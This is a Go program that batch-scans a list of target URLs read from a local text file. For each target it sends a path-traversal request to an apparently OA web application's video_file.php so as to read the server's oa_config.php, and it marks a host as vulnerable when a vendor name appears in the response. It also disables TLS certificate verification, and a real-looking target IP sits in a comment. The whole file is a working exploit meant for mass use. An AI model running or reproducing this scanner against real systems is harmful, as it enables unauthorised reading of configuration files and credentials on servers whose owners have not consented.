package main

import (
	"crypto/tls"
	"golang.org/x/text/encoding/simplifiedchinese"
	"net/http"
)

import (
	"fmt"
	"io/ioutil"
	//"net/http"
	"strings"
	"time"
)

func exp(index int, ip_ string) {
	println(index, ip_)
	//ip_ := "http://58.18.167.226:8088"
	url := ip_ + "/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php"
	//url := ip_
	println("调用exp函数")
	tr := &http.Transport{ //通过设置Transport的TLSClientConfig来忽略证书验证:
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	client := &http.Client{
		Timeout:   time.Second * 10,
		Transport: tr,
	}
	resp, err := client.Get(url)

	if err != nil {
		//println(err.Error())
		return
	}

	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		//println(err)
		return
	}

	// 解码gbk
	decoder := simplifiedchinese.GBK.NewDecoder()
	result, _ := decoder.Bytes(body)

	//fmt.Println(string(result))
	fmt.Println(http.Status)
	if resp.StatusCode == 200 {
		println("响应码为：", resp.StatusCode)
	}
	fmt.Println(resp.StatusCode, len(body))
	if strings.Contains(string((result)), "北京创信达科技有限公司") {
		println("存在sb")
		println(index, ip_)
		//println("存在baidu")
	}
}

func main() {
	file_path := "D:\\C#\\Go-code\\leanr_GO\\文件操作\\file\\url.txt"
	data, err := ioutil.ReadFile(file_path)
	if err != nil {
		fmt.Println(err)
		return
	}

	lines := strings.SplitAfter(string(data), "\r\n")
	// 忽略前 几 行
	start := 25
	end := len(lines)
	//println(len(lines))                     //查看txt文件的行数
	for i, line := range lines[start:end] { //切片的作用
		// 重新计算行号
		lineNo := i + start + 1
		//fmt.Printf("%d: %s\n", lineNo, line)
		line := strings.ReplaceAll(line, "\r\n", "")
		//fmt.Printf("%d: %s\n", lineNo, line)
		exp(lineNo, line)
	}

}
